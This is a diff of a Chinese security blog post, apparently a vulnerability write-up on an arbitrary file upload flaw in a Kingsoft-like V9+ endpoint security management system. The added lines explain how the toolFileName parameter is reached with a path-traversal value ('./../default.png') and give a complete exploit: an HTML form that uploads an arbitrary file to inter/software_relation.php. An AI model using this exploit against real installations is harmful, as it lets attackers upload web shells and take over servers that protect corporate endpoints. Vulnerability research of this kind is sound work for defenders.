@@ -2,11 +2,11 @@
   <head>
     <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>某山V9+终端安全系统产品 | ChongMeng</title>
-<link rel="shortcut icon" href="https://1946dream.github.io//favicon.ico?v=1628998606292">
+<title>某山V9+终端安全任意文件上传 | ChongMeng</title>
+<link rel="shortcut icon" href="https://1946dream.github.io//favicon.ico?v=1628999535798">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
 <link rel="stylesheet" href="https://1946dream.github.io//styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="某山V9+终端安全系统产品 | ChongMeng - Atom Feed" href="https://1946dream.github.io//atom.xml">
+<link rel="alternate" type="application/atom+xml" title="某山V9+终端安全任意文件上传 | ChongMeng - Atom Feed" href="https://1946dream.github.io//atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -30,7 +30,7 @@ http://www.ejinshan.net/lywz/zdv9
       <div class="main-content">
         <div class="site-header">
   <a href="https://1946dream.github.io/">
-  <img class="avatar" src="https://1946dream.github.io//images/avatar.png?v=1628998606292" alt="">
+  <img class="avatar" src="https://1946dream.github.io//images/avatar.png?v=1628999535798" alt="">
   </a>
   <h1 class="site-title">
     ChongMeng
@@ -83,14 +83,14 @@ http://www.ejinshan.net/lywz/zdv9
         <div class="post-detail">
           <article class="post">
             <h2 class="post-title">
-              某山V9+终端安全系统产品
+              某山V9+终端安全任意文件上传
             </h2>
             <div class="post-info">
               <span>
                 2021-08-14
               </span>
               <span>
-                2 min read
+                3 min read
               </span>
               
             </div>
@@ -172,14 +172,39 @@ try {
 </code></pre>
 <p>这里重点关注<br>
 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>t</mi><mi>o</mi><mi>o</mi><mi>l</mi><mi>F</mi><mi>i</mi><mi>l</mi><mi>e</mi><mi>N</mi><mi>a</mi><mi>m</mi><mi>e</mi><mo>=</mo></mrow><annotation encoding="application/x-tex">toolFileName=</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">t</span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.10903em;">N</span><span class="mord mathdefault">a</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span></span></span></span>_POST[&quot;toolFileName&quot;];<br>
-$gb2312_filename = $toolFileName;</p>
+$gb2312_filename = $toolFileName;<br>
+<img src="https://1946dream.github.io//post-images/1628999067165.png" alt="" loading="lazy"><br>
+需要构造一个存在的文件才可进入代码块1.<br>
+<img src="https://1946dream.github.io//post-images/1628999184046.png" alt="" loading="lazy"><br>
+搜索发现softmanagement文件夹下 存在default.png文件。<br>
+构造toolFileName =  ./../default.png</p>
+<h2 id="小坑">😿小坑</h2>
+<p>如果我们直接构造../default.png<br>
+<img src="https://1946dream.github.io//post-images/1628999233850.png" alt="" loading="lazy"><br>
+这里会变成 .../default.png 造成copy函数第二个参数不存在。</p>
+<h1 id="exp">💪EXP</h1>
+<pre><code>&lt;form action=&quot;URL/inter/software_relation.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;id&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;version&quot; value=&quot;&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;toolFileName&quot; value=&quot;./../default.png&quot;&gt;
+filename:&lt;input type=&quot;file&quot; name=&quot;toolImage&quot;&gt;
+&lt;button&gt;提交&lt;/button&gt;
+&lt;/form&gt;
+</code></pre>
+<p><img src="https://1946dream.github.io//post-images/1628999286236.png" alt="" loading="lazy"><br>
+<img src="https://1946dream.github.io//post-images/1628999304225.png" alt="" loading="lazy"></p>
 
               </div>
               <div class="toc-container">
                 <ul class="markdownIt-TOC">
 <li><a href="#%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E">👟历史漏洞</a></li>
 <li><a href="#%E4%B8%8B%E8%BD%BD%E5%9C%B0%E5%9D%80">🌂下载地址</a></li>
-<li><a href="#%E6%BC%8F%E6%B4%9E">漏洞</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E">漏洞</a>
+<ul>
+<li><a href="#%E5%B0%8F%E5%9D%91">😿小坑</a></li>
+</ul>
+</li>
+<li><a href="#exp">💪EXP</a></li>
 </ul>
 
               </div>
